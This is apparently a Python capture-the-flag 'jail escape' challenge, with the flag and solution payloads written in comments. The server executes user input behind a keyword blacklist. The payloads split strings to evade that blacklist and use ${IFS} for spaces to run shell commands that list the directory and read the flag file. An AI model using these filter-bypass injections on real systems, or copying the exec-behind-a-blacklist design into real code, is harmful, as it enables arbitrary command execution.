#!/usr/bin/env python3

# Flag : kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}

# First payload, eval("__impor"+"t__('o"+"s').sy"+"stem('ls')")  -> for listing the directory
# Last payload, eval("__impor"+"t__('o"+"s').sy"+"stem('ca"+"t${IFS}cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt')")  -> cat which filecontains the flag

def server():
	message = "You are in jail. Can you escape?"
	print(message)
	while True:
		try:
			data = input("> ")
			safe = True
			for char in data:
				if not (ord(char)>=33 and ord(char)<=126):
					print("[-] Badchar")
					safe = False
			with open("blacklist.txt","r") as f:
				badwords = f.readlines()
			for badword in badwords:
				if badword in data or data in badword:
					print("[-] Badword")
					safe = False
			print("[*] Safe : " + str(safe))
			if safe:
				print(exec(data))
			else:
				print("You used a bad word!")
		except Exception as e:
			print("Something went wrong.")
			print(e)
			exit()

if __name__ == "__main__":
	server()
